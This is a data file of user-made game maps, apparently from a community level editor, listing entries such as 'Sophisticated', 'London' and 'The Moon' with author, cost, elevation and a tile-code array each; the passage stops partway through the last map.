maps.push({name="Sophisticated",author="Mini",id="#1741361881",direction="forward",cost=306,elevation=0,map=[0,0,0,0,0,0,0,0,25,2,2,25,0,0,0,0,0,0,0,0,0,94,25,96,96,25,25,0,25,25,25,25,0,25,25,96,96,25,133,0,0,131,25,96,96,25,25,0,25,25,25,25,0,25,25,96,96,25,94,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,67,67,67,5,5,5,5,67,67,67,67,1,0,0,0,0,0,1,16,16,16,16,16,5,5,5,5,16,16,16,16,16,1,0,0,0,1,16,16,16,16,16,148,5,5,5,5,148,16,16,16,16,16,1,0,0,1,16,16,16,16,16,16,5,5,5,5,16,16,16,16,16,16,1,0,1,16,16,16,0,0,0,1,5,5,5,5,1,0,0,0,16,16,16,1,1,142,142,142,0,0,1,94,199,199,199,199,94,1,0,0,142,142,142,1,1,16,16,16,0,1,132,5,5,5,5,5,5,134,1,0,16,16,16,1,0,1,16,16,1,1,65,5,5,5,5,5,5,65,1,1,16,16,1,0,0,1,16,16,16,65,65,5,5,5,5,5,5,65,65,16,16,16,1,0,0,1,16,16,16,65,65,5,5,5,5,5,5,65,65,16,16,16,1,0,0,0,0,0,1,67,67,5,5,2,2,5,5,67,67,1,0,0,0,0]});
maps.push({name="Mini",author="Mini",id="#1741362471",direction="forward",cost=181,elevation=0,map=[0,0,0,0,0,0,113,113,113,2,2,113,113,113,0,0,0,0,0,0,0,0,0,0,0,0,113,113,113,113,113,113,113,113,0,0,0,0,0,0,0,0,0,0,0,0,113,113,113,113,113,113,113,113,0,0,0,0,0,0,0,0,0,0,0,0,13,33,93,53,90,142,53,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,76,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,53,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,82,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,76,90,82,33,76,90,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,100,13,53,76,33,82,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,142,33,90,142,76,33,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,90,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,48,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,94,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,91,33,82,142,53,91,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,13,53,13,82,76,90,33,13,0,0,0,0,0,0,0,0,0,0,0,0,113,113,113,113,113,113,113,113,0,0,0,0,0,0,0,0,0,0,0,0,113,113,113,2,2,113,113,113,0,0,0,0,0,0]});
maps.push({name="hey",author="ReBeL",id="#1741362754",direction="forward",cost=93,elevation=7,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,1,1,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,1,1,0,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,0,0,65,65,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Omega",author="Mini",id="#1741363054",direction="forward",cost=136,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,18,18,75,18,18,18,0,0,0,18,18,0,0,0,0,0,0,0,0,18,18,18,18,85,18,75,18,0,0,18,18,0,0,0,0,0,0,0,75,85,18,0,0,0,0,18,18,18,0,18,85,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,18,85,18,18,75,0,0,0,0,0,85,18,18,0,0,0,0,0,0,0,0,18,75,18,18,0,0,0,0,75,18,75,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,85,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,85,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,85,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,85,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,75,18,75,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,85,18,18,0,0,0,0,0,0,0,0,18,75,18,18,0,0,0,0,0,0,18,18,18,0,0,0,0,0,0,18,85,18,18,75,0,0,0,0,0,0,0,75,85,18,0,0,0,0,18,18,18,0,18,85,0,0,0,0,0,0,0,0,18,18,18,18,85,18,75,18,0,0,18,18,0,0,0,0,0,0,0,0,0,18,18,75,18,18,18,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0]});
maps.push({name="Trick or Treat",author="Mini",id="#1741364134",direction="forward",cost=170,elevation=0,map=[0,0,0,0,1,0,14,14,2,2,14,14,0,1,0,0,0,0,0,0,0,0,0,0,1,0,14,14,14,14,14,14,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,12,12,12,12,153,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,34,34,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,0,90,12,34,34,12,90,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,12,12,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,0,34,34,12,12,34,34,0,1,0,0,0,0,0,0,0,0,0,0,1,0,34,34,12,12,34,34,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,12,12,12,12,157,1,0,0,0,0,0,0,0,0,0,0,1,0,93,12,34,34,90,93,0,1,0,0,0,0,0,0,0,0,0,0,1,0,93,90,34,34,12,93,0,1,0,0,0,0,0,0,0,0,0,0,1,156,12,12,12,12,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,0,34,34,12,12,34,34,0,1,0,0,0,0,0,0,0,0,0,0,1,0,34,34,12,12,34,34,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,12,12,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,0,90,12,34,34,12,90,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,34,34,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,0,12,12,12,12,12,12,0,1,0,0,0,0,0,0,0,0,0,0,1,154,14,14,14,14,14,14,0,1,0,0,0,0,0,0,0,0,0,0,1,0,14,14,2,2,14,14,0,1,0,0,0,0,0,0]});
maps.push({name="Low Budget Mako",author="Mini",id="#1741365051",direction="right",cost=172,elevation=0,map=[0,0,0,23,56,56,2,2,56,56,23,0,0,0,0,0,0,0,0,0,0,0,0,23,56,56,56,56,56,56,23,0,0,0,0,0,0,0,0,0,0,0,0,23,56,56,56,56,56,56,23,0,0,0,0,0,0,0,0,0,0,0,0,23,142,142,142,142,142,142,23,0,0,0,0,0,0,0,0,0,0,0,0,23,56,56,56,56,56,90,23,0,0,0,0,0,0,0,0,0,0,0,0,23,97,56,56,56,90,90,23,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,96,96,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,35,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,35,35,0,0,0,0,0,37,36,36,37,37,37,37,37,37,37,37,37,37,37,37,0,0,0,0,0,37,36,36,36,36,36,36,36,36,36,36,36,36,36,2,0,0,0,0,0,37,36,36,36,36,36,36,36,36,36,36,36,36,36,2,0,0,0,0,0,37,36,36,37,37,37,37,37,37,37,37,37,37,37,37,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,35,35,0,0,0,0,0,37,36,36,37,0,0,0,0,0,0,0,0,0,0,35,0,0,0,0,0,37,93,36,37,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Path of Movement",author="Mini",id="#1741366794",direction="forward",cost=240,elevation=0,map=[0,0,0,0,0,0,0,29,29,2,2,29,29,0,0,0,0,0,0,0,0,1,1,0,0,0,0,29,29,29,29,29,29,0,0,0,0,1,1,0,1,100,65,1,0,0,0,29,0,0,0,0,29,0,0,0,1,65,100,1,1,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,1,65,65,1,12,65,65,0,130,130,29,29,0,0,0,0,29,29,130,130,0,65,65,12,12,12,65,0,130,130,29,29,0,0,0,0,29,29,130,130,0,65,12,12,0,12,12,0,130,130,29,29,0,0,0,0,29,29,130,130,0,12,12,0,0,126,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,126,0,0,0,0,0,0,0,18,18,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,93,94,0,0,0,0,94,93,0,0,0,0,0,0,0,0,0,0,0,0,93,94,0,0,0,0,94,93,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,18,18,0,0,0,0,0,0,0,127,126,0,0,0,0,0,0,0,0,0,0,0,0,0,0,126,127,0,0,12,12,0,130,130,29,29,0,0,0,0,29,29,130,130,0,12,12,0,12,12,65,0,130,130,29,29,0,0,0,0,29,29,130,130,0,65,12,12,12,65,65,0,130,130,29,29,0,0,0,0,29,29,130,130,0,65,65,12,1,65,65,1,0,0,0,0,0,0,0,0,0,0,0,0,1,65,65,1,1,100,65,1,0,0,0,29,0,0,0,0,29,0,0,0,1,65,100,1,0,1,1,0,0,0,0,29,29,29,29,29,29,0,0,0,0,1,1,0,0,0,0,0,0,0,0,29,29,2,2,29,29,0,0,0,0,0,0,0]});
maps.push({name="hru",author="ReBeL",id="#1741367159",direction="forward",cost=310,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,2,2,0,0,0,0,0,0,0,0,1,1,1,1,1,90,90,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,90,90,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,1,1,1,1,90,7,7,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,90,7,7,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,90,7,7,0,0,0,0,0,0,0,0,1,1,1,1,1,90,7,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,7,7,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,7,76,76,7,7,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,7,76,76,7,7,7,7,0,0,0,0,0,0,0,0,1,1,1,1,1,7,76,76,7,1,1,7,7,0,0,0,0,0,0,0,1,1,1,1,1,7,76,76,7,1,1,1,7,7,0,0,0,0,0,0,1,1,1,1,1,94,7,7,90,1,1,1,7,7,7,7,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,90,7,0,0,0,0,1,1,1,1,1,93,7,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,7,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,7,7,7,0,0,0,0,1,1,1,1,1,100,7,7,7,7,7,7,7,7,7,7,0,0,0,0,1,1,1,1,1,1,1,1,1,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Real Rise",author="Mini",id="#1741367628",direction="forward",cost=334,elevation=18,map=[0,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,0,0,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,0,0,7,7,85,7,7,7,7,7,7,7,7,7,7,7,85,7,7,7,0,0,8,8,8,8,8,8,85,8,8,8,8,8,8,8,8,8,8,8,0,0,85,9,9,9,9,9,9,9,9,9,9,9,85,9,9,9,9,9,0,0,10,10,10,85,10,10,10,10,10,85,10,10,10,10,10,10,10,10,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,85,11,0,0,12,12,12,12,12,12,85,12,12,12,12,12,12,12,12,12,12,12,0,0,12,12,12,12,12,12,12,12,12,12,12,12,85,12,12,12,12,12,0,0,12,4,4,12,12,12,12,12,4,4,12,12,12,12,12,4,4,12,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,16,16,16,16,141,141,16,16,16,16,16,16,141,141,16,16,16,16,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,19,3,3,19,19,19,19,19,3,3,19,19,19,19,19,3,3,19,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Bill Cipher",author="Mini",id="#1741368540",direction="left",cost=200,elevation=0,map=[0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,39,39,39,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,1,0,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,39,39,39,1,1,1,0,0,0,0,39,39,39,39,39,1,1,1,39,39,39,39,39,0,0,0,0,0,39,39,39,39,39,1,1,0,0,0,1,1,39,39,39,0,0,0,0,39,39,39,39,1,1,0,0,0,0,0,0,0,1,39,39,0,0,0,2,39,39,39,39,1,0,0,0,1,1,1,1,0,1,39,39,0,0,0,2,39,39,39,39,1,0,0,0,0,0,0,0,0,1,39,39,0,0,0,0,39,39,39,39,1,1,0,0,0,0,0,0,0,1,39,39,0,0,0,0,0,39,39,39,39,39,1,1,0,0,0,1,1,39,39,39,0,0,0,0,0,1,0,39,39,39,39,39,1,1,1,39,39,39,39,39,1,1,1,0,0,0,1,0,0,39,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,1,1,0,0,0,39,39,39,39,39,39,39,39,39,0,0,0,0,0,1,1,1,1,0,0,0,1,39,39,39,39,39,39,39,0,0,0,0,1,1,1,1,1,1,0,1,1,0,0,39,39,39,39,39,0,0,0,0,1,1,1,1,0,0,1,1,1,0,0,0,0,39,39,39,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="UNLOZE",author="Mini",id="#1741369529",direction="forward",cost=558,elevation=0,map=[1,1,1,1,1,1,1,1,64,2,2,64,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,64,64,64,64,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,1,1,1,94,64,0,0,24,67,67,67,67,67,67,67,67,67,67,67,67,24,1,1,94,64,0,0,24,67,67,67,67,67,67,67,67,67,67,67,67,67,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,67,67,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,67,67,24,1,1,1,24,24,24,24,24,24,24,0,24,24,24,24,24,24,67,67,24,1,1,24,67,67,67,67,67,67,1,1,67,67,67,67,67,67,67,24,1,1,24,67,67,67,67,67,67,67,1,1,67,67,67,67,67,67,24,1,1,24,67,67,24,24,24,24,24,24,0,24,24,24,24,24,24,24,1,1,1,24,67,67,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,67,67,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,24,67,67,67,67,67,67,67,67,67,67,67,67,67,24,0,0,64,93,1,1,24,67,67,67,67,67,67,67,67,67,67,67,67,24,0,0,64,93,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,64,64,64,64,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,64,2,2,64,1,1,1,1,1,1,1,1]});
maps.push({name="London",author="sivi",id="#1741372930",direction="left",cost=581,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,2,2,1,1,88,114,114,114,114,114,114,94,1,88,114,114,114,114,114,114,114,114,1,1,114,162,162,162,162,162,160,114,1,114,162,162,162,162,162,162,65,114,1,1,114,159,114,114,114,114,160,114,1,114,159,114,114,114,114,114,159,114,1,1,114,159,114,1,1,114,160,114,1,114,159,114,1,1,1,114,159,114,1,1,114,159,114,1,1,114,160,114,114,114,159,114,1,1,1,114,159,114,1,1,114,159,114,1,1,114,162,162,162,162,159,114,1,1,1,114,159,114,1,1,114,159,114,1,1,114,114,114,114,114,159,114,1,1,1,114,159,114,1,1,114,159,114,1,1,1,1,1,1,114,159,114,1,93,1,114,159,114,1,1,114,159,162,67,0,114,93,1,1,114,159,114,1,114,1,114,159,114,1,1,114,159,114,1,1,1,1,1,1,114,159,114,1,91,1,114,159,114,1,1,114,159,114,114,114,114,114,114,114,114,159,114,114,114,1,114,159,114,1,1,114,159,162,162,162,162,162,162,162,162,162,162,160,114,1,114,159,114,1,1,114,159,114,114,114,160,114,114,114,114,114,114,160,114,1,114,159,114,1,1,114,159,114,1,114,160,114,1,1,1,1,114,160,114,1,114,159,114,1,1,114,159,114,1,114,160,114,1,1,1,1,114,160,114,1,114,159,114,1,114,114,159,114,1,114,160,114,114,114,114,114,114,160,114,114,114,159,114,1,2,114,159,114,1,114,162,162,162,162,162,162,162,162,162,162,162,159,114,1,2,114,114,114,1,88,114,114,114,114,114,114,114,114,114,114,114,114,88,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Collaboration",author="Mini",id="#1741374030",direction="forward",cost=286,elevation=0,map=[0,0,0,0,1,15,15,15,15,2,2,15,15,15,15,1,0,0,0,0,0,0,0,0,0,1,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,22,22,0,0,1,94,15,15,15,15,94,1,0,0,22,22,0,0,0,0,22,22,22,0,0,1,15,15,15,15,1,0,0,22,22,22,0,0,0,0,22,131,22,195,15,15,15,15,15,15,15,15,197,22,131,22,0,0,0,0,22,100,22,195,15,15,15,15,15,15,15,15,197,22,100,22,0,0,0,0,22,22,22,0,0,1,115,115,115,115,1,0,0,22,22,22,0,0,0,0,22,22,0,0,0,0,97,115,115,102,0,0,0,0,22,22,0,0,0,0,141,141,0,0,0,0,0,115,115,0,0,0,0,0,141,141,0,0,0,0,5,5,5,5,65,65,0,115,115,0,65,65,5,5,5,5,0,0,0,0,5,5,5,5,65,65,0,115,115,0,65,65,5,5,5,5,0,0,0,0,141,141,0,0,0,0,0,115,115,0,0,0,0,0,141,141,0,0,0,0,22,22,0,0,0,0,99,115,115,104,0,0,0,0,22,22,0,0,0,0,22,22,22,0,0,1,115,115,115,115,1,0,0,22,22,22,0,0,0,0,22,100,22,196,15,15,15,15,15,15,15,15,198,22,100,22,0,0,0,0,22,131,22,196,15,15,15,15,15,15,15,15,198,22,131,22,0,0,0,0,22,22,22,0,0,1,15,15,15,15,1,0,0,22,22,22,0,0,0,0,22,22,0,0,1,132,15,15,15,15,132,1,0,0,22,22,0,0,0,0,0,0,0,1,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,1,15,15,15,15,2,2,15,15,15,15,1,0,0,0,0]});
maps.push({name="The Moon",author="Mini",id="#1741375065",direction="forward",cost=197,elevation=17,map=[0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,2,2,199,19,93,19,0,0,0,0,0,0,0,0,0,0,0,0,0,199,27,27,199,0,19,0,0,0,0,0,0,0,15,15,14,14,0,0,0,199,131,27,199,0,0,0,0,0,17,17,16,16,15,15,14,14,13,13,0,199,199,199,199,0,0,0,19,18,17,17,16,16,15,15,14,13,13,13,13,0,0,0,0,0,0,19,19,18,18,17,16,16,0,0,13,13,132,13,13,0,0,0,0,0,0,19,19,18,18,0,0,0,0,0,13,13,13,13,13,14,0,0,0,0,94,20,19,0,0,0,0,0,0,0,0,13,13,13,14,14,0,0,0,0,20,20,19,0,0,0,0,0,0,13,0,0,13,13,14,14,0,0,0,0,20,20,0,0,0,0,0,0,13,94,13,0,0,15,15,15,0,0,0,0,21,21,0,0,0,0,0,0,0,13,0,0,0,15,15,15,0,0,0,0,22,21,21,0,0,0,0,0,0,0,0,0,0,15,16,16,0,0,0,0,133,22,22,0,0,0,0,0,0,0,0,0,0,17,16,16,0,0,0,0,0,0,23,100,0,0,24,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,18,17,0,0,0,0,0,0,0,0,0,24,24,94,24,24,0,0,0,18,18,18,0,0,18,0,199,199,199,199,0,0,24,24,24,0,0,0,19,19,18,0,0,18,93,18,199,44,134,199,0,0,0,24,0,0,100,20,20,19,19,0,0,0,18,0,199,44,44,199,0,0,0,0,0,0,133,21,20,19,0,0,0,0,0,0,199,2,2,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="im sorry luffaren",author="ReBeL",id="#1741390232",direction="forward",cost=551,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,0,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,0,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,0,0,0,0,0,100,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,100,0,0,0,100,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,100,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,72,72,72,72,72,40,40,72,72,72,72,72,0,0,135,0,0,0,0,0,94,40,40,40,40,40,40,40,40,40,40,94,135,135,135,0,0,40,97,0,1,1,1,1,1,96,96,1,1,1,1,1,0,0,0,0,0,40,40,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dex sucks ass",author="ReBeL",id="#1741392521",direction="forward",cost=212,elevation=-9,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,199,0,1,1,1,0,0,0,0,0,0,0,0,0,0,5,5,5,1,1,199,0,1,134,1,0,5,5,5,5,5,5,0,0,0,5,199,5,132,1,199,0,1,5,1,0,5,65,65,65,65,5,0,0,0,5,199,1,1,1,199,5,5,5,5,0,5,5,0,0,5,5,0,0,0,0,0,0,0,0,199,5,0,5,0,0,94,5,5,5,5,94,0,0,0,5,5,5,5,5,199,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,199,5,0,5,5,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,199,5,5,0,5,0,5,0,0,5,0,5,0,0,0,5,5,5,5,5,199,5,0,0,5,0,5,0,0,5,0,5,0,0,0,5,0,0,0,5,199,0,0,0,0,0,5,0,0,0,0,5,0,0,0,5,0,0,0,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,0,5,5,0,5,5,0,0,0,5,0,0,0,5,5,5,5,5,199,5,5,0,5,0,0,5,5,5,5,5,0,0,0,0,0,5,0,0,199,5,0,0,5,0,0,0,5,5,0,0,0,0,0,0,5,93,5,0,199,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,0,0,0,5,199,0,0,0,0,0,5,5,0,0,5,5,0,0,0,0,0,0,0,0,199,0,65,65,65,0,0,0,0,0,0,0,0,0,0,5,5,5,0,5,199,0,5,5,5,0,0,0,5,131,0,0,0,0,0,5,133,5,5,5,199,0,5,2,2]});
maps.push({name="A brief intermission",author="ReBeL",id="#1741397222",direction="forward",cost=184,elevation=0,map=[0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,125,125,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,0,0,0,0,0,10,0,0,0,0,0,0,0,0,0,0,10,10,10,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,3,0,0,0,10,0,0,0,0,0,0,0,0,10,10,0,0,0,0,91,14,0,0,0,0,10,0,0,0,0,0,126,126,10,10,0,0,0,0,91,91,0,0,0,0,10,10,0,0,0,0,10,10,10,0,0,0,0,0,91,91,0,0,0,0,0,10,10,0,0,0,10,10,10,0,0,0,0,0,91,91,0,0,0,0,0,0,10,10,0,0,10,10,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,10,10,0,0,10,0,0,0,0,0,34,91,91,34,0,0,0,0,0,0,0,10,10,126,10,10,10,10,0,0,96,96,96,96,0,0,0,0,0,0,0,10,10,0,126,10,10,10,0,0,0,91,91,93,0,0,0,0,0,0,10,0,0,0,0,126,10,10,10,0,93,91,91,93,0,0,0,0,0,10,10,0,0,0,0,126,10,10,10,10,0,0,0,0,0,0,0,0,10,10,127,0,0,0,0,0,126,10,10,10,0,0,0,0,0,0,0,10,10,127,0,0,0,0,0,0,0,126,10,10,10,0,0,0,0,0,10,10,127,0,0,0,0,0,0,0,0,0,97,10,10,0,0,0,10,10,127,127,0,0,0,0,0,0,0,0,0,0,0,0,10,2,2,10,10,0,0,0,0,0,0,0,0]});
maps.push({name="Trustmebro",author="ReBeL",id="#1741399584",direction="forward",cost=322,elevation=3,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,94,6,6,6,6,6,91,91,6,6,6,6,1,9,10,10,93,1,0,0,93,6,6,6,6,6,91,91,6,6,6,6,1,8,0,10,94,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,1,7,0,0,0,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,1,6,0,0,10,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,1,3,0,0,10,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,0,0,0,0,0,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,0,0,0,0,0,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,1,0,0,0,0,1,0,0,6,6,6,6,6,6,91,91,6,6,6,6,1,1,1,1,3,1,0,0,11,11,91,91,91,91,91,91,6,6,